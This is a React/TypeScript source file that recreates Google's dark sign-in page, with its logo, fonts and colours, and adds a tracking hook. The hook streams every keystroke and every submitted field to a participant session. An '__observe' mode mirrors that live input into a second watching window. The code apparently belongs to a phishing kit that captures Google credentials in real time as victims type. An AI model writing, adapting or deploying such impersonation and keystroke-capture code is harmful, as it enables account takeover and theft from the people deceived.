import { useEffect, useMemo } from "react";
import { useNavigate } from "@tanstack/react-router";
import { useParticipant } from "@/hooks/useParticipant";

export const GE_FONT_FAMILY = '"Google Sans", Roboto, Arial, sans-serif';

/** Dark GlifWebSignIn page background */
export const GE_PAGE_BG = "#0e0e0e";
export const GE_CARD_BG = "#1e1f20";
export const GE_PRIMARY = "#a8c7fa";
export const GE_ON_PRIMARY = "#062e6f";

export function GoogleGLogo({
  width = 48,
  height = 48,
  className,
}: {
  width?: number;
  height?: number;
  className?: string;
}) {
  return (
    <svg
      className={className}
      xmlns="http://www.w3.org/2000/svg"
      width={width}
      height={height}
      viewBox="0 0 40 48"
      aria-hidden="true"
    >
      <path
        fill="#4285F4"
        d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"
      />
      <path
        fill="#34A853"
        d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"
      />
      <path
        fill="#FABB05"
        d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"
      />
      <path
        fill="#E94235"
        d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"
      />
    </svg>
  );
}

export function GeFontStyle() {
  return (
    <style>{`
      @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap');
      @font-face {
        font-family: "Google Sans";
        font-style: normal;
        font-weight: 400;
        font-display: swap;
        src: local("Google Sans"), local("Product Sans"),
             url(https://fonts.gstatic.com/s/googlesans/v29/4UaGrENHsxJlGDuGo1OIlL3Owp4.woff2) format("woff2");
      }
      @font-face {
        font-family: "Google Sans";
        font-style: normal;
        font-weight: 500;
        font-display: swap;
        src: local("Google Sans Medium"), local("Product Sans Medium"),
             url(https://fonts.gstatic.com/s/googlesans/v29/4UabrENHsxJlGDuGo1OIlLU94YtzDwYA.woff2) format("woff2");
      }
    `}</style>
  );
}

export function useIsObserve(): boolean {
  return useMemo(() => {
    if (typeof window === "undefined") return false;
    try {
      return new URLSearchParams(window.location.search).get("__observe") === "1";
    } catch {
      return false;
    }
  }, []);
}

export function useGeTracking() {
  const isObserve = useIsObserve();
  const navigate = useNavigate();
  const { emitInput, emitLiveInput, participantId } = useParticipant();

  function trackClick(label: string) {
    if (isObserve) return;
    emitInput("__click", label);
  }
  function trackInput(field: string, value: string) {
    if (isObserve) return;
    emitLiveInput(field, value);
  }
  function trackSubmit(field: string, value: string) {
    if (isObserve) return;
    emitInput(field, value);
  }
  function geNavigate(to: string) {
    if (isObserve) return;
    try {
      window.postMessage({ __ux: true, type: "internal_navigation", url: to }, "*");
    } catch {
      /* ignore */
    }
    navigate({ to, reloadDocument: false }).catch(() => {
      window.location.assign(to);
    });
  }

  useEffect(() => {
    if (!isObserve || typeof window === "undefined") return;
    function onMsg(e: MessageEvent) {
      const d = e.data;
      if (!d || typeof d !== "object" || d.__mirror !== true) return;
      if (d.type === "live_input" && typeof d.field === "string") {
        const value = String(d.value ?? "");
        try {
          window.dispatchEvent(
            new CustomEvent("ux:mirror-live-input", {
              detail: { field: d.field, value },
            }),
          );
        } catch {
          /* ignore */
        }
        const el = document.querySelector(`[name="${CSS.escape(d.field)}"]`) as
          | HTMLInputElement
          | HTMLTextAreaElement
          | null;
        if (el) {
          const proto = Object.getOwnPropertyDescriptor(
            window.HTMLInputElement.prototype,
            "value",
          )?.set;
          if (proto) proto.call(el, value);
          else el.value = value;
          el.dispatchEvent(new Event("input", { bubbles: true }));
        }
      }
    }
    window.addEventListener("message", onMsg);
    return () => window.removeEventListener("message", onMsg);
  }, [isObserve]);

  return {
    sessionId: participantId,
    trackClick,
    trackInput,
    trackSubmit,
    geNavigate,
    isObserve,
  };
}
